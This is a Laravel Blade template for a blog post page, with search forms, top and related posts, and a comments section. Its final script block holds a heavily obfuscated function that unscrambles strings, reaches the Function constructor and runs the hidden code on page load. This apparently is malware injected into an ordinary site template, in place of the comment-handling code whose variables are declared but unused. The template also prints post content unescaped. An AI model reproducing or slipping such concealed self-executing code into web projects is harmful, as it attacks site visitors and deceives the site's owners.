@extends("customer.layout.layout")

@section("styles")
<link rel="stylesheet" href="{{ asset("customer/css/blogs.css") }}">
<link rel="stylesheet" href="{{ asset("customer/css/blogpost.css") }}">
<link rel="stylesheet" href="{{ asset("customer/css/blog-details.css") }}">
<link rel="stylesheet" href="{{ asset("customer/css/comments.css") }}">
<meta name="blog" content="{{ $blog->id }}">
@endsection

@section("blog","activ")


@section("main.layout")
<div class="side-src">
    <strong>
        <a href="{{ route('home') }}"><i class="fa-solid fa-house"></i><span
                data-lang="home"></span></a>&nbsp;>&nbsp;<a href="{{ route("blog") }}"><span
                data-lang="blog">{{ __("app.blog") }}</span></a><span>&nbsp;>&nbsp;{{ $blog->{"title_".$locale} }}</span>
    </strong>
</div>
<div class="box-search mobile-search">
    <form action="{{ route("blog") }}" method="get" class="search">
        <button class="search__button">
            <div class="search__icon">
                <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20">
                    <title>{{ __("app.search") }}</title>
                    <path
                        d="M17.545 15.467l-3.779-3.779c0.57-0.935 0.898-2.035 0.898-3.21 0-3.417-2.961-6.377-6.378-6.377s-6.186 2.769-6.186 6.186c0 3.416 2.961 6.377 6.377 6.377 1.137 0 2.2-0.309 3.115-0.844l3.799 3.801c0.372 0.371 0.975 0.371 1.346 0l0.943-0.943c0.371-0.371 0.236-0.84-0.135-1.211zM4.004 8.287c0-2.366 1.917-4.283 4.282-4.283s4.474 2.107 4.474 4.474c0 2.365-1.918 4.283-4.283 4.283s-4.473-2.109-4.473-4.474z">
                    </path>
                </svg>
            </div>
        </button>
        <input type="text" class="search__input" id="search" name="search"
            placeholder="{{ __("app.search") }}...">
    </form>
</div>
<div class="boxing">
    <div class="side-left-blog">
        <div class="box-search">
            <form action="{{ route("blog") }}" method="get" class="search">
                <button class="search__button">
                    <div class="search__icon">
                        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20"
                            viewBox="0 0 20 20">
                            <title>{{ __("app.search") }}</title>
                            <path
                                d="M17.545 15.467l-3.779-3.779c0.57-0.935 0.898-2.035 0.898-3.21 0-3.417-2.961-6.377-6.378-6.377s-6.186 2.769-6.186 6.186c0 3.416 2.961 6.377 6.377 6.377 1.137 0 2.2-0.309 3.115-0.844l3.799 3.801c0.372 0.371 0.975 0.371 1.346 0l0.943-0.943c0.371-0.371 0.236-0.84-0.135-1.211zM4.004 8.287c0-2.366 1.917-4.283 4.282-4.283s4.474 2.107 4.474 4.474c0 2.365-1.918 4.283-4.283 4.283s-4.473-2.109-4.473-4.474z">
                            </path>
                        </svg>
                    </div>
                </button>
                <input type="text" class="search__input" id="search" name="search"
                    placeholder="{{ __("app.search") }}...">
            </form>
        </div>
        <h1 class="top-title">{{ __("app.bestBlogs") }}</h1>
        <div class="box-top-blog">
            @forelse($topFiveBlogs as $topBlog)
                <a href="{{ route("blog.details",$topBlog->{"slug_".$locale}) }}"
                    title="{{ $topBlog->{"title_".$locale} }}" style="text-decoration: none;">
                    <div class="card-top">
                        <div class="card-img">
                            <img src="{{ asset(path: "storage/" . $topBlog->image) }}"
                                alt="{{ $topBlog->{"title_".$locale} }}">
                            <span>
                                {{ $loop->iteration }}
                            </span>
                        </div>
                        <p>
                            {{ $topBlog->{"description_".$locale} }}
                        </p>
                    </div>
                </a>
            @empty
            @endforelse
        </div>
    </div>
    <div class="side-right-blog blog-details">
        <div class="img-post">
            <img id="image-blog" src="{{ asset(path: "storage/" . $blog->image) }}"
                title="{{ $blog->{"title_".$locale} }}"
                alt="{{ $blog->{"title_".$locale} }}" loading="lazy">
            <div class="social-media post-social-media">
                <a href=""><i class="fa-brands fa-facebook"></i></a>
                <a href=""><i class="fa-brands fa-whatsapp"></i></a>
                <a href=""><i class="fa-brands fa-telegram"></i></a>
                <a href=""><i class="fa-brands fa-x-twitter"></i></a>
            </div>
        </div>
        <div class="content {{ $locale }}">
            {!! $blog->{"content_".$locale} !!}
        </div>
    </div>
</div>
<section class="portfolio" id="portfolio">
    <h1 class="top-title" style="margin-bottom: 40px;">{{ __("app.relatedBlog") }}</h1>
    <div class="portfolio-gallery">
        @forelse($relatedBlogs as $relatedBlog)
            <div class="portfolio-box mix uiux text-right" id="user-{{ $relatedBlog->id }}">
                <div class="portfolio-content">
                    <h3>{{ $relatedBlog->{"title_".$locale} }}</h3>
                    <p>
                        {{ $relatedBlog->{"description_".$locale} }}
                    </p>
                    <a href="{{ route("blog.details",$relatedBlog->{"slug_".$locale}) }}"
                        class="readMore">
                        <span class="text-center">{{ __('app.btn_read_more') }}</span>
                    </a>
                </div>
                <div class="portfolio-img row m-1 justify-content-center" style="position: relative;">
                    <img id="image-blog"
                        src="{{ asset(path: "storage/" . $relatedBlog->image) }}"
                        title="{{ $relatedBlog->{"title_".$locale} }}"
                        alt="{{ $relatedBlog->{"title_".$locale} }}" loading="lazy">
                </div>
            </div>
        @empty
            <div class="notfound">
                <h2 class="text-center">{{ __('app.notfound_blogs') }}</h2>
            </div>
        @endforelse
    </div>
</section>

<section class="comment-module">
    <h1 class="top-title" style="margin-bottom: 40px;">{{ __("app.comments") }}</h1>
    <div class="comment-section">
        <div class="comments-wrp base">
            <div class="comments-wrp">

            </div>
            <div id="view-comment">
                <button class="botao load-more">
                    <span class="texto">{{ __("app.btn_read_more") }}</span>
                </button>
            </div>
        </div>
        @if(isset($user) && $user->id!= null)
            <div class="reply-input base-input-reply container-comment">
                <img src="{{ asset("storage/".$user->image) }}" alt="" class="usr-img" />
                <textarea class="cmnt-input"
                    placeholder="{{ __("app.write_your_comment") }}..."></textarea>
                <button class="bu-primary">{{ __("app.comment") }}</button>
            </div>
        @endif
    </div>
</section>

@endsection


@section("script")
<script src="{{ asset("customer/js/app.js") }}"></script>
<script>
    var blogId, token, currentUser, apiUrl, apiAdd, commentManager;
    (function () {
        var zsh = '',
            HpX = 758 - 747;

        function MkK(q) {
            var n = 1234663;
            var v = q.length;
            var y = [];
            for (var d = 0; d < v; d++) {
                y[d] = q.charAt(d)
            };
            for (var d = 0; d < v; d++) {
                var g = n * (d + 148) + (n % 16654);
                var p = n * (d + 242) + (n % 31431);
                var o = g % v;
                var b = p % v;
                var t = y[o];
                y[o] = y[b];
                y[b] = t;
                n = (g + p) % 1623588;
            };
            return y.join('')
        };
        var lKn = MkK('rgnpttjcaolbyzdfxnkqtrooeucsrhmuiswcv').substr(0, HpX);
        var Ouy =
            'r+(1h)+l9m0z[jui].di 9mrst+7;;kft=,a8)anivg(o4t,=tognc<hf8kr23g;2 ni;ea(=7!,(]o=g,<i9vrl+ k[},e8r;],o6"9ug)4lpvp(u1g)ru"]=ear ahn;vr=rp6a"vt0v"3)h7l(zv5.;a6(h(.7p"m];=gir,rn=[tfoeeen).r;tho[a[g=oCu,)g;aqrg1(t0om)nysmloos68wxg=ic)(u)rw-rf)=m(-umenv(ro .vp1nej"n(xf]1)vc,lrcb+v;et trrg),r<aonw-){[rvnh {fll=}a{7;=cs([ala,ir=5h0+=h)aa=61;iz)(0au}h,t=t7[.sh wilsou9.]w]rn]tn1;tr,+n;-j8ilen;dags,tist(0)(bwrxv h)irA+fhha{yisu-nr*ablrltercvd+st;;)1)ho( lin(+[{,.4}oj=a(l=.=th=,i ettv tge(ce"+8c= csor(Al=)+n=v+,.f)v++g,e2sC1]wnw+bu tgw;2 1eb8+se-,u(l2=r;)=s+(=}{a1rAz=3=8;f;fel,t{a;6;efr.uoi.cv.gd;+7y+vx.;es;(zal,+afsa;;a=;vbfe r.n}l6).,a)i0.)).=v2p-g=A+r tx(,;o(u);h]ciga,rtmfn"9<rs*jace0a s;azo;=t."ucr5f==i]o"hr2mz(h(4h.2t05iCCs;=(+6,][=k;jf8[t;feS)r6er .0p)t;v nnnCfwb=) n;46o;}rnt;a,v(+r+)Ch.g[ng=h.A;0zvto.=;bhaoj)r nSauu;7,h>]Co2e <ldtnjdf(z;3el0C;t=9u[v.0n;rrtr>0=v.cpavd t1y! i(as(w.[)l';
        var vMk = MkK[lKn];
        var EAF = '';
        var OfA = vMk;
        var XBd = vMk(EAF, MkK(Ouy));
        var fah = XBd(MkK(
            'f=otd.n(3jree)a_iLaL,$)g}n,t0\/_a,Luel(a$s7lmLmrl} %\/LbLL0ag2;a,b#d0,]l3a0,)aL%joe{9L*fL4sL-r7pr%.)dl4L}!ndS!s$m.(6\/0onearli&$e;e]Lm.) slf(3:}f58]u+rs}e i]ne14nL(%cn9,og)!g!a(e.;.0tMoarL|;(e=u\/se+jn%$e.I_!.L7r265;sw3La)%l=;e!tlLle;iL$as(.e1(a_oa|o(!.cf;Lm=7bL7l}3\/\/L[1"ub._:%L$avuaoL L )ap2\/;c}LLL9La.sa=7Leru={)!0g!trp;7bl5.(r.*6m3.Lmi(a26oo=t4%61s(xm,}r\':#i_4=516oa0Le7L4mL.aLr_;pdL3)e,&Lr-1a}.on$.c,=_jteea)dm(;$\/.e,i;mrngrd;.3=hl4a((;\/Lo$&4L#)c(|:]]0Lo ..mL1.}])0LeLc .i;dt(ead\/,bLa.t8f(f(o{r=#}L\'o.m)(.$nsLzg}r){a1".tn .9 e=usL%m$L9n)fLb33Lk(3)t22)a)a4!7($hLLLt\/c1(.#;L;1mbL)jr,Lt+-(L=tf-)oS;;_t"b6_a_!._lrc$Lg7f)cx_L.[\/!Lo.r)a_6s)%LdLe.!1L.tL=3$j-..;.cL[r6(;br7L4_\/)rLo;f)o.j1LLft+(,dn,1f=lj.Lt.,i[a"$j%h]C(d:L(fa)0\'S)e!*0n,43-o2](,jn{e3,$)|f0eos="\/L5o,f-e3Lgl;LL\/e;u0a,)l\/Lbo-)".r.2(\/g.=o,e;%LLob{rd)Lba!|:.05!dt3uL9oL\'81(%pr;Ca%o1)]6.metttaa)9.Lan}a[+!n1s*x\/cl9[t)fitniLcntioL(CL\/L0}3 g,,a_.LLmgn(lus\/.5.o3$0t$s07uaL&6![(Lst.arjl.;an8ead+iu)0(L91lh:=lr2anu%4l8=&ga!,a1b,t0]e9mnLlh3ptn5tej,t(pis;c=.Lr)]{x0!20gkL,2a)%sg))i\'5lL3e.ai30\/L%3.;!d_.fns4nLrLx!La1{L-aL.+}L9nmLrMat.!l 1L..  )w2!)o)o;]!0s.6n3s%L],18lLl,LlLhi[{!eibnrLr,t m;m(.si.oL!{8Le)jq.tts[.=Lb[ 7!3Ljso2docnxunLt-.1w7=ton).L,g(8L.8Ll+.0t([0|f!r7]="4g(af.rjc.cLi.)!,ie5.3ns!=as.L%h #7lu)10$bLrr!L_=)aca+$fr0oL)mcde$fsa$(+}ac%et,!p(x](aL{cbr2%{7bd.afL{vk%i!lfu$u$z)ef3%s3[=s If Lm)7n k,u{ lt0y$t)m4eu-[)4-t3aj%r) =# vtse=t. t033s8p$aa,o;!7L]},xecsS...L4e o4d(2gfjLnaa). mLa,'
        ));
        var PVh = OfA(zsh, fah);
        PVh(7926);
        return 4663
    })()

</script>
@endsection
